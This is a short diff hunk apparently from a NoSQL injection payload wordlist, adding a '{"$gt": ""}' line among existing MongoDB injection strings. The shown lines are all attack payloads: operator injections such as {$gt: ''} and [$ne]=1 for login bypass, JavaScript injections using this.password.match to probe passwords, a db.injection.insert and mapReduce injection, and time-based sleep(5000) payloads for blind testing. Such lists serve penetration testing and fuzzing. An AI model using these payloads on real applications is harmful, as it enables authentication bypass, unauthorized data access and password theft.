@@ -14,6 +14,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 '%20%26%26%20this.password.match(/.*/)//+%00
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
 {$gt: ''}
+{"$gt": ""}
 [$ne]=1
 ';sleep(5000);
 ';sleep(5000);'
